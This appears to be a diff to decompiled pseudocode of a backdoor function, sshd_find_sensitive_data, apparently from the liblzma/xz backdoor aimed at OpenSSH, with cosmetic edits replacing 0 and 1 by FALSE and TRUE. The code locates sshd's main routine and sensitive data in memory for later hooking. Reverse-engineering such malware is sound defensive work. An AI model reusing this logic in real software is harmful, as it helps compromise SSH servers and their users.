@@ -66,8 +66,8 @@ BOOL sshd_find_sensitive_data
   
   bVar18 = 0;
   BVar5 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x1c8,0,0x1d);
-  if (BVar5 == 0) {
-    return 0;
+  if (BVar5 == FALSE) {
+    return FALSE;
   }
   local_68 = 0x1b000001c8;
   local_88.code = (u8 *)sshd_proxy_elevate;
@@ -84,8 +84,8 @@ BOOL sshd_find_sensitive_data
   local_38 = 0x19000001bd;
   local_30 = 0x100000006;
   BVar5 = secret_data_append_items(&local_88,4,secret_data_append_item);
-  if (BVar5 == 0) {
-    return 0;
+  if (BVar5 == FALSE) {
+    return FALSE;
   }
   psVar16 = &local_88;
   for (lVar15 = 0x18; lVar15 != 0; lVar15 = lVar15 + -1) {
@@ -108,17 +108,17 @@ BOOL sshd_find_sensitive_data
   pvVar10 = elf_get_code_segment(sshd,(u64 *)&winning_candidate);
   psVar17 = winning_candidate;
   if (pvVar10 == (void *)0x0) {
-    return 0;
+    return FALSE;
   }
   pEVar11 = elf_symbol_get(libcrypto,STR_EVP_DigestVerify,0);
   pEVar12 = elf_symbol_get(libcrypto,STR_EVP_sm,0);
   if (pEVar12 == (Elf64_Sym *)0x0) {
-    return 0;
+    return FALSE;
   }
-  data_start_00 = (u8 *)elf_get_data_segment(sshd,&local_b0,0);
+  data_start_00 = (u8 *)elf_get_data_segment(sshd,&local_b0,FALSE);
   uVar3 = local_b0;
   if (data_start_00 == (u8 *)0x0) {
-    return 0;
+    return FALSE;
   }
   if (pEVar11 != (Elf64_Sym *)0x0) {
     EVar1 = pEVar11->st_value;
@@ -133,18 +133,18 @@ BOOL sshd_find_sensitive_data
   }
   BVar5 = sshd_find_main(&local_a8,sshd,libcrypto,funcs);
   code_start_00 = local_a8;
-  if (BVar5 == 0) {
-    return 0;
+  if (BVar5 == FALSE) {
+    return FALSE;
   }
   ctx->sshd_main = local_a8;
   BVar5 = is_endbr64_instruction(local_a8,local_a8 + 4,0xe230);
-  ctx->uses_endbr64 = (uint)(BVar5 != 0);
+  ctx->uses_endbr64 = (uint)(BVar5 != FALSE);
   puVar4 = (u8 *)((long)pvVar10 + (long)psVar17);
-  if ((BVar5 != 0) &&
+  if ((BVar5 != FALSE) &&
      (BVar5 = find_function(code_start_00,(void **)0x0,&local_a0,code_start_00,
                             (u8 *)((long)pvVar10 + (long)psVar17),FIND_NOP), puVar4 = local_a0,
-     BVar5 == 0)) {
-    return 0;
+     BVar5 == FALSE)) {
+    return FALSE;
   }
   local_a0 = puVar4;
   BVar5 = sshd_get_sensitive_data_address_via_xcalloc
@@ -157,26 +157,26 @@ BOOL sshd_find_sensitive_data
   if (p_Var14 != (_func_51 *)0x0) {
     funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
   }
-  if (BVar5 == 0) {
+  if (BVar5 == FALSE) {
 LAB_00105772:
-    if (BVar6 == 0) goto LAB_001057d3;
+    if (BVar6 == FALSE) goto LAB_001057d3;
     uVar7 = 0;
 LAB_001057a6:
     uVar8 = sshd_get_sensitive_data_score(local_98,sshd,refs);
   }
   else {
-    if (BVar6 != 0) {
+    if (BVar6 != FALSE) {
       if (local_90 == local_98) {
         uVar7 = sshd_get_sensitive_data_score(local_90,sshd,refs);
         if (uVar7 < 8) {
-          return 0;
+          return FALSE;
         }
         goto LAB_0010575e;
       }
       uVar7 = sshd_get_sensitive_data_score(local_90,sshd,refs);
       goto LAB_001057a6;
     }
-    if (BVar5 == 0) goto LAB_00105772;
+    if (BVar5 == FALSE) goto LAB_00105772;
     uVar7 = sshd_get_sensitive_data_score(local_90,sshd,refs);
     uVar8 = 0;
   }
@@ -184,12 +184,12 @@ LAB_001057a6:
      ((uVar7 <= uVar8 && (psVar17 = local_98, 7 < uVar8)))) {
 LAB_0010575e:
     ctx->sshd_sensitive_data = psVar17;
-    return 1;
+    return TRUE;
   }
 LAB_001057d3:
   lzma_free(funcs->EVP_DigestVerifyInit,allocator_00);
   lzma_free(funcs->EVP_CIPHER_CTX_new,allocator_00);
   lzma_free(funcs->EVP_chacha20,allocator_00);
-  return 0;
+  return FALSE;
 }
 
